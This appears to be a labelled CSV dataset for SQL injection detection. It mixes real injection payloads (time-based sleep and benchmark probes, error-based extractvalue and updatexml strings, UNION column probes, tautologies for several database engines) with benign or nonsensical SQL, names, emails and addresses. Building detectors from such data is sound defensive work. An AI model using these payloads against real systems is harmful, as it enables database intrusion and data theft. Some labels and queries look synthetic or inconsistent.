Query,Label
"1'+  (  select bldn where 8321  =  8321 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",1
"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT MIN ( around )  AS major FROM found,0
SELECT AVG ( comfortable ) FROM health,0
"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#",1
51975226x,0
SELECT * FROM  ( SELECT trade FROM package ) ,0
1.16E+15,0
"  SELECT damageID AS ID, fact AS wherever FROM wolf",0
" select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",1
SELECT * FROM Customers  WHERE CustomerName NOT LIKE 'a%';,0
SELECT LOG ( 2 ) ;,0
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,1
SELECT DISTINCT missing FROM son,0
benegiles,0
"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT eventually ( s )  FROM double SELECT property FROM wish,0
bernad fermoselle,0
SELECT * FROM century ORDER BY tobacco DESC,0
"   SELECT COUNT ( additional ) , listen FROM believed BY sort",0
"  UPDATE him SET belt =  'pleasant', City =  'particular' WHERE account =  above",0
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1
"-2734'  )   union all select 5510,5510,5510,5510,5510#",1
legris@beautifulbody.yu,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",1
"   SELECT city,four,spirit,temperature,jump     (  (  occur JOIN stepped ON occasionally.over =  till.compare )   INNER JOIN oppositeON Orders.manner =  disappear.afternoonID ) ",0
"c/ belgica, 69 2?d",0
SELECT * FROM pair WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY;,0
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ocfi'  =  'ocfi",1
DELETE FROM roof WHERE part = 'lesson',0
1'  )   where 2208  =  2208 rlike sleep  (  5  )  #,1
" SELECT column_name ( s )  FROM gray,separate",0
SELECT effort ( s )  FROM congress SELECT doll FROM say,0
1  )   as usnn where 3201  =  3201,1
desans totohuetotzint,0
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
1   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   9452  =  9452,1
"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",1
SELECT * FROM thread FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM president,0
SELECT AVG ( mile ) FROM outer SELECT SUM ( fight ) ,0
-8745'  )   as xpwv where 8855  =  8855 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
7.64748E+15,0
"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
victorico,0
1'||  (  select 'byxb' where 8351  =  8351 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',1
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",1
SELECT * FROM command WHERE carry = 'forward'  OR properly = 'outer',0
SELECT * FROM plain WHERE whole = 'zoo' LIMIT 3,0
ballou@adondeir.mn,0
SELECT AVG ( alphabet )  FROM image  SELECT SUM ( company ) ,0
-8410'   )    )     )   or 8571  =  8571--,1
22468230j,0
SELECT MIN ( loose )  AS arrow FROM these,0
SELECT somebody ( s )  FROM private SELECT future FROM state,0
select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,1
"1' and make_set  (  8403  =  8403,8899  )   and 'lnwe'  =  'lnwe",1
"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",1
budd9,0
SELECT * FROM  ( SELECT explanation FROM spin ) ,0
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
SELECT MIN ( easy )  AS tax FROM throughout,0
1'  )   where 2227  =  2227,1
SELECT COUNT ( lakeID ) FROM point,0
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",1
"calle dean miranda 106, 6-f",0
hiss@ajuntamentdebarcelona20.yu,0
"   SELECT bare,directly,brave,younger,stay     (  (  seed JOIN teacher ON ordinary.death =  everyone.consist )   INNER JOIN cleanON Orders.old =  stepped.fenceID ) ",0
SELECT * FROM outer  WHERE headed = grain,0
SELECT * FROM that  WHERE suddenly = connected,0
SELECT * FROM vast WHERE slide = 'known' LIMIT 3,0
1  )   where 2223  =  2223,1
18540,0
enris6rar,0
"1"" where 9669  =  9669",1
SELECT * FROM snow WHERE rising = 'stand'  OR better = 'bear',0
"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
cadek,0
"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",1
"select sleep  (  5  )   and   (  ""%""  =  """,1
"1'  )   where 8628  =  8628 union all select null,null,null--",1
anda matamalas,0
SELECT until FROM nobody,0
1e1ador,0
huesca,0
"  SELECT * FROM gulf WHERE pen NOT IN  ( 'enough', 'do', 'women' )  ",0
seyler@miami-beach.gw,0
SELECT boy ( s )  FROM card SELECT carry ( s ) ,0
SELECT AVG ( movie ) FROM modern,0
SELECT * FROM honor ORDER BY angry DESC,0
8888,0
3.99279E+14,0
"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",1
solana de los barros,0
-6310 or 6715  =  3399,1
"  UPDATE which SET tower =  'gone', City =  'record' WHERE gate =  hospital",0
SELECT * FROM late WHERE led = 'pound' FETCH FIRST 3 ROWS ONLY,0
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",1
SELECT * FROM whale WHERE idea BETWEEN '1996-07-01' AND '1996-07-31',0
"1'  )   where 2802  =  2802 union all select null,null,null#",1
" SELECT column_name ( s )  FROM connected,purple",0
reto8sivo,0
thuswald,0
SELECT * FROM nest WHERE    NOT burst = 'source',0
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
38656027l,0
"1'  )   union all select null,null,null,null,null#",1
"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1
SELECT * FROM  ( SELECT atmosphere FROM quite ) ,0
SELECT * FROM hang 3 SELECT * FROM against,0
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"  UPDATE operation SET bat =  'below', City =  'ice' WHERE president =  fell",0
"glorieta puerta de hierro, 57",0
SELECT * FROM ever WHERE setting LIKE '%clean%',0
49626,0
"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",1
7311,0
SELECT * FROM should WHERE test IN  ( SELECT pig FROM exclaimed ) ,0
SELECT AVG ( easily ) FROM sat,0
"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
SELECT * FROM lady ORDER BY positive,0
9.31575E+15,0
SELECT COUNT ( noun )  FROM popular,0
6.39488E+14,0
"1""   )    )    as puws where 7006  =  7006",1
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1
SELECT * FROM rhyme ORDER BY heavy DESC,0
"1""  )   where 8098  =  8098",1
SELECT melted FROM strange,0
"c/ san gines, 180, 3-d",0
1  )   where 9160  =  9160,1
29450,0
1'  )   and 7533  =  7533 and   (  'cryr'  =  'cryr,1
SELECT AVG ( itself ) FROM choose SELECT SUM ( this ) ,0
"-4325' or make_set  (  9354  =  9354,7185  )  ",1
1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1
SELECT * FROM page WHERE rising = 'taken'  AND  ( thank = 'beside' OR bare = 'increase' ) ,0
SELECT * FROM tin FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM lunch,0
in8ros742tiva,0
1'||  (  select 'ywjy' where 7579  =  7579,1
SELECT AVG ( equal ) FROM our,0
SELECT * FROM gone WHERE around = 'bear' LIMIT 3,0
"  UPDATE bag SET bottom =  'pie', City =  'yet' WHERE mixture =  heading",0
SELECT TOP 3 * FROM roar WHERE tomorrow = 'light',0
mario,0
1'||  (  select 'eyiy' from dual where 8127  =  8127,1
17751,0
"-3518  )   union all select 1877,1877,1877,1877#",1
SELECT TOP 50 PERCENT * FROM father SELECT * FROM coming FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM hide,0
1' where 9544  =  9544,1
DELETE FROM thou WHERE needs = 'force',0
SELECT TOP 3 * FROM alive SELECT * FROM black 3SELECT * FROM completely,0
SELECT * FROM rush 3 SELECT * FROM anyway,0
51842682s,0
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
SELECT TOP 3 * FROM pony WHERE getting = 'life' SELECT * FROM ate,0
alma,0
SELECT AVG ( merely ) FROM until SELECT SUM ( give ) ,0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'hcpo' like 'hcpo,1
"  SELECT MAKEDATE ( 2017, 100 ) ;",0
62573420b,0
-3450' where 4478  =  4478 or 9323  =  9323#,1
sosa,0
8.3888E+15,0
SELECT * FROM upper WHERE strip NOT LIKE 'steady%',0
del ngel kercad,0
3200,0
SELECT AVG ( window )  FROM simply  SELECT SUM ( thick ) ,0
daly@diagnosticoradiologico.jm,0
"-9772' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'igaa'  =  'igaa",1
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
SELECT again ( s )  FROM sets LEFT JOIN,0
SELECT * FROM wife WHERE split IN  ( SELECT rise FROM good ) ,0
"1""   )    )    as sqow where 8752  =  8752",1
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",1
SELECT AVG ( shaking ) FROM account,0
" select * from users where id  =  1 or   (  \+  )    =  1 union select 1,@@VERSION -- 1",1
SELECT AVG ( Price ) FROM noted,0
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
select * from users where id  =  1 <@. or 1  =  1 -- 1,1
f5o9a8en9e,0
"1',  (  case when 2872  =  2872 then 1 else null end  )  ",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""psbz""  =  ""psbz",1
SELECT form ( s )  FROM grown,0
"1 where 4331  =  4331 union all select null,null,null,null,null,null#",1
SELECT * FROM can,0
"iif  (  3204  =  8489,3204,1/0  )  ",1
"1'  )   union all select null,null,null,null,null,null,null#",1
3641,0
tacoronte,0
julin,0
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'blie'  =  'blie",1
SELECT * FROM cause WHERE family = 'wise'  AND City = 'lovely',0
-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1
" SELECT LPAD ( CustomerName, 30, ""ABC"" )  AS LeftPadCustomerName FROM Customers; ",0
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'xtdj'  =  'xtdj",1
2111,0
"1""   )    )    order by 1--",1
7.78503E+15,0
1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,1
SELECT * FROM managed WHERE away = 'married'  OR valuable = 'grandfather',0
SELECT TOP 3 * FROM stay SELECT * FROM until 3SELECT * FROM bar,0
1'  )   where 6624  =  6624 and 5392  =  8258,1
"-5640""   )    )    or 9792  =  2728--",1
SELECT City FROM Customers UNION ALL,0
select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1
or   (  EXISTS  ) ,1
"1'+  (  select sxco where 1623  =  1623 union all select null,null--",1
"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",1
1  )   where 4866  =  4866,1
SELECT movement ( s FROM shadow RIGHT JOIN,0
SELECT * FROM naturally ORDER BY meal DESC,0
SELECT * FROM itself WHERE made = 'equal'  OR universe = 'concerned',0
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,1
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",1
45110,0
SELECT * FROM straw WHERE hunt = 'deeply'  OR fly = 'truth',0
"SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  'Brazil';",0
" SELECT * FROM glass ORDER BY rabbit ASC, lay DESC",0
" select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",1
"  SELECT * FROM scared WHERE hunter IN  ( 'dress', 'birds', 'loose' )  ",0
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",1
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""x"", ""m"" ) ;",0
SELECT * FROM behavior WHERE uncle NOT LIKE 'ruler%',0
"  SELECT degree,forward,train FROM health LEFT JOIN Orders ON string.colorID =  pole.difficult ORDER BY dog.farm",0
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'zovb' like 'zovb",1
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'vjkf' like 'vjkf",1
"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',1
SELECT * FROM child WHERE    NOT blow = 'flight',0
"1"" where 5250  =  5250",1
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1
SELECT expect ( s )  FROM doing FULL OUTER JOIN,0
"1"" where 3510  =  3510",1
SELECT * FROM ran WHERE element NOT LIKE '[spell]%',0
" select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",1
" SELECT * FROM serious ORDER BY wrote ASC, spin DESC",0
dieasl_yannatos@vilainstal.coop,0
select   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,1
6rce8o,0
"1%'   )    )    union all select null,null,null#",1
"1""   )    )    rlike sleep  (  5  )  #",1
SELECT TOP 3 * FROM been,0
SELECT replace ( s )  FROM cause,0
"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1
"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",1
"1"" where 5552  =  5552 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4653' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",1
"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
norring-fujikawa@autoconstruccion.au,0
SELECT quick ( s )  FROM distant,0
SELECT COUNT ( both ) FROM divide,0
"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1
1'   )    )    as gfzb where 7904  =  7904,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT income FROM oxygen UNION SELECT therefore FROM courage ORDER BY stronger,0
SELECT * FROM  ( SELECT silly FROM thin ) ,0
ridgely.loyat@cbgerindote.sk,0
"  SELECT yourself AS hay, pan AS [speech]  FROM determine",0
"1""  )   where 6072  =  6072 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '",1
SELECT AVG ( arrow ) FROM parent SELECT SUM ( atomic ) ,0
"  SELECT share,direct,what FROM without LEFT JOIN Orders ON appropriate.greatestID =  you.creature ORDER BY raise.mission",0
"  SELECT mileID AS ID, limited AS come FROM wish",0
inglis@baltasarsantos.vu,0
"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
alm.ora,0
3596,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3946 )  ORDER BY meta_id ASC",0
" SELECT * FROM missing ORDER BY string, along",0
e00tr6o,0
4067,0
28%,1
"1"" where 6352  =  6352",1
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,1
"1""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""agaz""  =  ""agaz",1
